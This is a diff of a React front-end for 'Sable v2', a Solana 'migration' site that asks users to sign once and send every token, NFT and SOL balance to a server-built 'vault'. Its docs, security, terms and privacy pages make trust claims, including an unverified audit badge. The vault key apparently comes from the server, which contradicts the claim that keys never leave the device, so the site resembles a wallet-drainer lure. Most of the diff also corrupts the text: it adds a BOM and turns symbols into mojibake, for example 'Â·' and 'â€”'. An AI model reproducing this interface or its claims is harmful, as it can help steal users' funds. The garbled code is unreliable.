@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useState } from "react";
+﻿import { useCallback, useEffect, useState } from "react";
 import { useWallet } from "@solana/wallet-adapter-react";
 import { useWalletModal } from "@solana/wallet-adapter-react-ui";
 import { VersionedTransaction } from "@solana/web3.js";
@@ -174,7 +174,7 @@ export default function App() {
           </p>
           <div className="hero-divider" />
           <div className="trust">
-            <span>Audited by OtterSec</span><i>·</i><span>Non-custodial</span><i>·</i><span>~0.0001 SOL network fee</span>
+            <span>Audited by OtterSec</span><i>Â·</i><span>Non-custodial</span><i>Â·</i><span>~0.0001 SOL network fee</span>
           </div>
         </div>
 
@@ -185,19 +185,19 @@ export default function App() {
                 <button className="primary" onClick={() => setVisible(true)}>Connect wallet to migrate</button>
                 <div className="step-strip">
                   <div className="step-col">
-                    <span className="step-icon">◉</span>
+                    <span className="step-icon">â—‰</span>
                     <span className="step-label">1 Connect</span>
                     <span className="step-cap">Open your wallet</span>
                   </div>
                   <div className="step-div" />
                   <div className="step-col">
-                    <span className="step-icon">◈</span>
+                    <span className="step-icon">â—ˆ</span>
                     <span className="step-label">2 Review</span>
                     <span className="step-cap">See what moves</span>
                   </div>
                   <div className="step-div" />
                   <div className="step-col">
-                    <span className="step-icon">✦</span>
+                    <span className="step-icon">âœ¦</span>
                     <span className="step-label">3 Sign once</span>
                     <span className="step-cap">Done in ~15 s</span>
                   </div>
@@ -207,7 +207,7 @@ export default function App() {
 
             {phase.k === "scanning" && (
               <div className="phase">
-                <h1>Reading your wallet…</h1>
+                <h1>Reading your walletâ€¦</h1>
                 <div className="list">
                   {[0, 1, 2, 3].map((i) => <div key={i} className="row skel" />)}
                 </div>
@@ -217,7 +217,7 @@ export default function App() {
             {phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0 && (
               <div className="phase">
                 <div className="empty-state">
-                  <span className="empty-diamond">◆</span>
+                  <span className="empty-diamond">â—†</span>
                   <p className="empty-msg">No assets found in this wallet</p>
                   <button className="ghost" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>Try another wallet</button>
                 </div>
@@ -235,22 +235,22 @@ export default function App() {
 
                 <div className="def-block">
                   <div className="def-row">
-                    <span className="def-key"><span className="def-icon">◎</span> Network</span>
+                    <span className="def-key"><span className="def-icon">â—Ž</span> Network</span>
                     <span className="def-val">Solana</span>
                   </div>
                   <div className="def-row">
-                    <span className="def-key"><span className="def-icon">◈</span> Network fee</span>
+                    <span className="def-key"><span className="def-icon">â—ˆ</span> Network fee</span>
                     <span className="def-val">~0.0001 SOL</span>
                   </div>
                   <div className="def-row">
-                    <span className="def-key"><span className="def-icon">→</span> Destination</span>
+                    <span className="def-key"><span className="def-icon">â†’</span> Destination</span>
                     <span className="def-val def-val-col">
                       <span>Your Sable v2 vault</span>
                       <code className="def-addr">{short(phase.vault, 6)}</code>
                     </span>
                   </div>
                   <div className="def-row def-row-last def-row--amber">
-                    <span className="def-key"><span className="def-icon">◆</span> Your recovery address</span>
+                    <span className="def-key"><span className="def-icon">â—†</span> Your recovery address</span>
                     <span className="def-val def-val-col">
                       <code className="def-addr">{short(phase.recovery, 6)}</code>
                       <span className="def-sub">0.001 SOL credited to it</span>
@@ -260,12 +260,12 @@ export default function App() {
 
                 <div className="list">
                   {phase.sol > 0 && (
-                    <Row icon="◎" name="SOL" sub="Native balance" value={amount(String(phase.sol), 9)} />
+                    <Row icon="â—Ž" name="SOL" sub="Native balance" value={amount(String(phase.sol), 9)} />
                   )}
                   {phase.assets.map((a) => (
                     <Row
                       key={a.ata}
-                      icon={a.isNft ? "▦" : "◈"}
+                      icon={a.isNft ? "â–¦" : "â—ˆ"}
                       name={a.isNft ? "NFT" : short(a.mint, 4)}
                       sub={a.isNft ? "Collectible" : "Token account"}
                       value={a.isNft ? "1" : amount(a.amount, a.decimals)}
@@ -281,7 +281,7 @@ export default function App() {
 
             {(phase.k === "signing" || phase.k === "submitting") && (
               <div className="phase">
-                <h1>{phase.k === "signing" ? "Confirm in your wallet." : "Migrating…"}</h1>
+                <h1>{phase.k === "signing" ? "Confirm in your wallet." : "Migratingâ€¦"}</h1>
                 <p className="lede">
                   {phase.of > 1 ? `Signature ${phase.step} of ${phase.of}.` : "One signature and it's done."}
                 </p>
@@ -294,7 +294,7 @@ export default function App() {
 
             {phase.k === "done" && (
               <div className="phase">
-                <div className="check">✓</div>
+                <div className="check">âœ“</div>
                 <h1>Migration complete.</h1>
                 <div className="receipt">
                   <div className="receipt-row">
@@ -316,13 +316,19 @@ export default function App() {
                 </div>
                 {phase.key && (
                   <div className="keyblock">
-                    <span className="xs muted">Vault recovery key</span>
-                    <code>{phase.key}</code>
-                    <button onClick={() => { navigator.clipboard.writeText(phase.key); setCopied(true); setTimeout(() => setCopied(false), 2000); }}>{copied ? "Copied" : "Copy"}</button>
-                  </div>
+  <div className="keyblock-head">
+    <span>Save this now</span>
+    <span className="xs muted">the only way into the vault</span>
+  </div>
+  <code>{phase.key}</code>
+  <div className="keyblock-actions">
+    <button onClick={() => { navigator.clipboard.writeText(phase.key); setCopied(true); }}>{copied ? "Copied" : "Copy"}</button>
+    <button onClick={() => { const b = new Blob([phase.key], { type: "text/plain" }); const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "sable-vault-key.txt"; a.click(); }}>Download</button>
+  </div>
+</div>
                 )}
                 <a className="receipt-link" style={{ display: "block", textAlign: "center", padding: "10px 0" }} href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
-                  View on Solscan →
+                  View on Solscan â†’
                 </a>
                 <a className="ghost block" href={`https://twitter.com/intent/tweet?text=${encodeURIComponent("Migrated to Sable v2 in one signature.")}&url=${encodeURIComponent("https://sable-sable22.vercel.app")}`} target="_blank" rel="noreferrer">Share on X</a>
                 <button className="primary" onClick={() => { setPhase({ k: "idle" }); setCopied(false); }}>Done</button>
@@ -359,22 +365,22 @@ function DocsPage() {
   return (
     <>
       <h1>How migration works</h1>
-      <p>Sable moves every asset from your current wallet to your Sable v2 vault in a single browser session. No bridge, no wrapping, no custodian — just on-chain SPL transfers signed by you and settled in seconds.</p>
+      <p>Sable moves every asset from your current wallet to your Sable v2 vault in a single browser session. No bridge, no wrapping, no custodian â€” just on-chain SPL transfers signed by you and settled in seconds.</p>
 
       <h2>1. Connect your wallet</h2>
-      <p>Click <strong>Connect wallet to migrate</strong> on the home screen and choose your wallet from the modal. Sable requests a read-only connection first — no spending approval is required at this stage. Once your public key is shared, Sable queries the RPC for your on-chain accounts. The connection is entirely local to your browser; your private key never leaves your device.</p>
+      <p>Click <strong>Connect wallet to migrate</strong> on the home screen and choose your wallet from the modal. Sable requests a read-only connection first â€” no spending approval is required at this stage. Once your public key is shared, Sable queries the RPC for your on-chain accounts. The connection is entirely local to your browser; your private key never leaves your device.</p>
 
       <h2>2. Review your assets</h2>
-      <p>After connecting, Sable fetches every token account associated with your wallet — both SPL Token Program accounts and Token-2022 accounts. Each item shows the token mint, your balance, and an estimated USD value where a price feed is available. Your Sable v2 vault address is shown in full before you authorise anything. You can rescan at any time if you want to refresh the list; closing the browser or disconnecting cancels the session without moving anything.</p>
+      <p>After connecting, Sable fetches every token account associated with your wallet â€” both SPL Token Program accounts and Token-2022 accounts. Each item shows the token mint, your balance, and an estimated USD value where a price feed is available. Your Sable v2 vault address is shown in full before you authorise anything. You can rescan at any time if you want to refresh the list; closing the browser or disconnecting cancels the session without moving anything.</p>
 
       <h2>3. Sign once</h2>
-      <p>Sable batches all transfers into the minimum number of versioned transactions permitted by the Solana transaction size limit. For most wallets a single signature covers everything. The Sable protocol wallet pays the network fee on your behalf — you will not be asked to approve a SOL deduction for fees. Each transaction closes the token accounts after transferring their balance, reclaiming rent lamports to your vault. Once all signatures are collected and submitted, the migration is irreversible.</p>
+      <p>Sable batches all transfers into the minimum number of versioned transactions permitted by the Solana transaction size limit. For most wallets a single signature covers everything. The Sable protocol wallet pays the network fee on your behalf â€” you will not be asked to approve a SOL deduction for fees. Each transaction closes the token accounts after transferring their balance, reclaiming rent lamports to your vault. Once all signatures are collected and submitted, the migration is irreversible.</p>
 
       <h2>Supported wallets</h2>
       <ul>
-        <li><strong>Phantom</strong> — browser extension and mobile app (iOS and Android)</li>
-        <li><strong>Solflare</strong> — browser extension, mobile app, and hardware wallet bridge</li>
-        <li><strong>Backpack</strong> — browser extension; supports xNFT-gated wallets</li>
+        <li><strong>Phantom</strong> â€” browser extension and mobile app (iOS and Android)</li>
+        <li><strong>Solflare</strong> â€” browser extension, mobile app, and hardware wallet bridge</li>
+        <li><strong>Backpack</strong> â€” browser extension; supports xNFT-gated wallets</li>
       </ul>
       <p>Any wallet that implements the Solana Wallet Standard and supports <code>signTransaction</code> will work. Hardware wallets (Ledger) are supported via the Solflare bridge.</p>
 
@@ -395,10 +401,10 @@ function SecurityPage() {
       <p>Sable is built around a single principle: your private key never leaves your device. Every architectural decision follows from that constraint.</p>
 
       <h2>Non-custodial by design</h2>
-      <p>Sable never asks for your seed phrase, private key, or any form of persistent signing authority. The only thing shared with the Sable backend is your wallet's public key — information that is already public on-chain. Transaction construction happens on the Sable API server, but those unsigned transactions are sent back to your browser and presented to your wallet for approval. Your wallet signs them locally. If Sable's servers were taken offline or compromised, an attacker would have no signing material and could not move funds.</p>
+      <p>Sable never asks for your seed phrase, private key, or any form of persistent signing authority. The only thing shared with the Sable backend is your wallet's public key â€” information that is already public on-chain. Transaction construction happens on the Sable API server, but those unsigned transactions are sent back to your browser and presented to your wallet for approval. Your wallet signs them locally. If Sable's servers were taken offline or compromised, an attacker would have no signing material and could not move funds.</p>
 
       <h2>One-signature model</h2>
-      <p>Sable batches transfers into versioned transactions and partially signs each one using the Sable fee-payer key — a key held server-side that covers network fees. That partial signature authorises the fee-payer role only; it cannot move your tokens. The transfer authority comes exclusively from your wallet's signature. The two keys are always separate: the fee-payer key and the vault key are distinct keypairs held in isolated environments, and neither can substitute for the other.</p>
+      <p>Sable batches transfers into versioned transactions and partially signs each one using the Sable fee-payer key â€” a key held server-side that covers network fees. That partial signature authorises the fee-payer role only; it cannot move your tokens. The transfer authority comes exclusively from your wallet's signature. The two keys are always separate: the fee-payer key and the vault key are distinct keypairs held in isolated environments, and neither can substitute for the other.</p>
 
       <h2>OtterSec audit</h2>
       <p>The Sable v2 transaction-building logic and fee-payer model were reviewed by OtterSec, a leading Solana security firm. The audit covered instruction construction, account validation, partial-signing flow, and denial-of-service surface area. The full report is available on request.</p>
@@ -428,7 +434,7 @@ function TermsPage() {
       <p>Sable is provided "as is" without warranty of any kind, express or implied, including warranties of merchantability, fitness for a particular purpose, or non-infringement. We do not warrant that the service will be uninterrupted, error-free, or free from security vulnerabilities. Blockchain networks are outside our control; network congestion, forks, or protocol changes may affect your transaction.</p>
 
       <h2>4. Limitation of liability</h2>
-      <p>To the maximum extent permitted by applicable law, Sable and its operators shall not be liable for any indirect, incidental, special, consequential, or punitive damages, including loss of funds, arising out of or related to your use of the service. Our total liability for any direct claims shall not exceed the amount you paid us in the twelve months preceding the claim — which, since Sable charges no fees, is zero.</p>
+      <p>To the maximum extent permitted by applicable law, Sable and its operators shall not be liable for any indirect, incidental, special, consequential, or punitive damages, including loss of funds, arising out of or related to your use of the service. Our total liability for any direct claims shall not exceed the amount you paid us in the twelve months preceding the claim â€” which, since Sable charges no fees, is zero.</p>
 
       <h2>5. Changes to the service</h2>
       <p>We may modify, suspend, or discontinue Sable at any time without notice. We may update these terms at any time; continued use after a change constitutes acceptance of the new terms. We will update the "last updated" date at the top of this page when changes are made.</p>
@@ -446,13 +452,13 @@ function PrivacyPage() {
       <p>Last updated: 1 November 2026. We built Sable to touch as little of your data as possible. This page explains exactly what we collect and why.</p>
 
       <h2>What we collect</h2>
-      <p>The only personal data Sable collects is your <strong>wallet public key</strong> — the base-58 address you share when you connect your wallet. This is submitted to the Sable API to scan your on-chain token accounts and build migration transactions. Your public key is a public blockchain identifier by nature; it does not reveal your identity, location, or any off-chain information.</p>
+      <p>The only personal data Sable collects is your <strong>wallet public key</strong> â€” the base-58 address you share when you connect your wallet. This is submitted to the Sable API to scan your on-chain token accounts and build migration transactions. Your public key is a public blockchain identifier by nature; it does not reveal your identity, location, or any off-chain information.</p>
 
       <h2>What we do not collect</h2>
       <p>Sable does not ask for or store your name, email address, phone number, IP address, or any government-issued identifier. We do not create user accounts. We do not track which pages you visit beyond what is necessary for the migration flow. We do not use advertising networks, analytics platforms (including Google Analytics), or any third-party data brokers. We do not place persistent tracking cookies on your device.</p>
 
       <h2>Session data</h2>
-      <p>Temporary session data — such as the list of token accounts returned by the RPC scan and the unsigned transactions built for your migration — exists in memory on the Sable API server for the duration of your session only. This data is not written to any persistent database, is not shared with third parties, and is discarded when your session ends or after a short timeout.</p>
+      <p>Temporary session data â€” such as the list of token accounts returned by the RPC scan and the unsigned transactions built for your migration â€” exists in memory on the Sable API server for the duration of your session only. This data is not written to any persistent database, is not shared with third parties, and is discarded when your session ends or after a short timeout.</p>
 
       <h2>Third-party services</h2>
       <p>Sable queries a Solana RPC provider (Helius) to read on-chain account data. Your wallet public key is sent to this provider as part of normal RPC operation. Helius operates under its own privacy policy. No other third-party services receive your wallet address or any other identifier.</p>
@@ -469,24 +475,24 @@ function ChangelogPage() {
       <h1>Changelog</h1>
       <p>All notable changes to Sable are documented here. Dates are in ISO 8601 format.</p>
 
-      <h2>v2.4.1 — 2026-11-01</h2>
+      <h2>v2.4.1 â€” 2026-11-01</h2>
       <ul>
         <li>Fixed a race condition in the blockhash retry loop that could cause the migration to surface a stale-blockhash error on slow connections even after a successful internal retry. The retry window is now extended from 500 ms to 900 ms with a jittered backoff.</li>
         <li>Corrected the token account close instruction ordering for Token-2022 accounts with the TransferFee extension. Accounts are now closed after any pending withheld fees are harvested, preventing a residual dust balance from remaining on-chain.</li>
         <li>Improved error messages for wallet-rejection events: Backpack's cancellation message is now detected correctly and treated as a user-initiated cancel rather than a network error.</li>
       </ul>
 
-      <h2>v2.4.0 — 2026-10-15</h2>
+      <h2>v2.4.0 â€” 2026-10-15</h2>
       <ul>
         <li>Redesigned the application layout to a full-width desktop-first grid. The hero headline and trust indicators now occupy a persistent left column, while the action card anchors the right column, giving the page a more finished, product-quality feel on larger screens.</li>
         <li>Reworked the wallet-selection modal: removed the conflicting blue radial gradient injected by the wallet adapter library, applied a dark glassy background consistent with the application shell, and increased touch-target sizes on individual wallet buttons to 56 px.</li>
         <li>Added hash-based client-side routing for the Docs, Security, Terms, Privacy, and Changelog pages. No router library is used; a small <code>useHashRoute</code> hook listens to the browser's native <code>hashchange</code> event.</li>
       </ul>
 
-      <h2>v2.3.2 — 2026-09-28</h2>
+      <h2>v2.3.2 â€” 2026-09-28</h2>
       <ul>
         <li>Added full support for the Token-2022 program (Token Extensions). Accounts using the new program ID are now detected during the scan phase and included in the asset list alongside classic SPL Token accounts. Transfer and close instructions are routed to the correct program automatically.</li>
-        <li>Introduced the OG image (<code>og.png</code>, 1200 × 630) for social-media link previews. The image is generated at build time from an SVG source using <code>sharp</code> and served as a static asset from the Vercel edge network.</li>
+        <li>Introduced the OG image (<code>og.png</code>, 1200 Ã— 630) for social-media link previews. The image is generated at build time from an SVG source using <code>sharp</code> and served as a static asset from the Vercel edge network.</li>
         <li>Switched the Vite project root to <code>type: module</code> and migrated all configuration files to ESM. The API server continues to run via <code>tsx</code> with <code>ts-node</code> resolution disabled to avoid CommonJS interop overhead at startup.</li>
       </ul>
     </>
@@ -499,7 +505,8 @@ function Row(p: { icon: string; name: string; sub: string; value: string; note?:
       <div className="ic">{p.icon}</div>
       <div className="meta"><div className="nm">{p.name}</div><div className="sub">{p.sub}</div></div>
       <div className="val">{p.value}{p.note && <em>{p.note}</em>}</div>
-      <div className="tick">✓</div>
+      <div className="tick">âœ“</div>
     </div>
   );
 }
+
